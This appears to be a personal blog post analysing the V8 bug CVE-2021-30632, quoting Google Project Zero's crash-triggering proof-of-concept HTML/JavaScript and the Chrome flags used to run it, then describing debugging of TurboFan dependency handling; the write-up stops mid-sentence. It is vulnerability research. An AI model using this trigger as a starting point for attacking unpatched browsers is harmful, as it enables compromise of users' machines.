
---
layout: post
title: "CVE-2021-30632 Analysis"
---

打算练习一下英文写作，所以这篇尝试用英文写。

Analysis V8 vulnerability CVE-2021-30632.

## Enviroment

### Get Vulnerable Exe

According to [google P0 0day-RCAs](https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-30632.html), this vulnerability affects version pre 93.0.4577.82. With the help of https://vikyd.github.io/download-chromium-history-version/#/, I got the download url of chromium 93.0.4573.1 Win64 with pdb file, https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html?prefix=Win_x64/900323/. I also built a debug version of chromium for a better debugging experience. 

## Prepare POC

Steal this POC code from Google P0 0day RCAs page.

```html
<html>
	<body>
		<script>
			function store(y) {
  x = y;
}

function load() {
  return x.b;
}

var x = {a : 1};
var x1 = {a : 2};
var x2 = {a : 3};
var x3 = {a : 4};

store(x1);
%PrepareFunctionForOptimization(store);
store(x2);

x1.b = 1;

%OptimizeFunctionOnNextCall(store);
store(x2);

x.b = 1;

%PrepareFunctionForOptimization(load);
load();

%OptimizeFunctionOnNextCall(load);
load();

store(x3);

%DebugPrint(load());
		</script>
	</body>
</html>
```
use `python -m http.server 9999`  create a site at port 9999.

## Triger Crash

Use `./chrome.exe --no-sandbox --enable-logging=stderr --js-flags="--allow-natives-syntax --trace-turbo"` start chrome, navigate to http://localhost:9999/.


## Analysis

Debug the crash with Visual Studio and the Microsoft Child Process Debugging Power Tool plugin. Backtace shows crash happens when %DebugPrint try to access a invalid memory address.

IR 

JSLoadGlobal

![[Pasted image 20230222011313.png]]

![[Pasted image 20230222011158.png]]

When debugging the `JSNativeContextSpecialization::ReduceJSLoadGlobal` function.  `dependencies()->DependOnGlobalProperty` and `dependencies()->DependOnStableMap` draw my attention. 

I guess the dependencies processing has a bug, so that modify global variable x do not invalidate the dependent code, then  `%DebugPrint(load())` end up reading invalid memory address.

so I search the keyworld dependency and find function named `PipelineImpl.CommitDependencies`, which is response to add code object to it's corresponde object's map.

If my guess is rigth, `store(x3);` should be wrong, so I set debug point in function ` StoreIC::Store`, but the debug pointer never reached. After that I realize function  `store` is JIT compiled, 

## Reference

- https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-30632.html


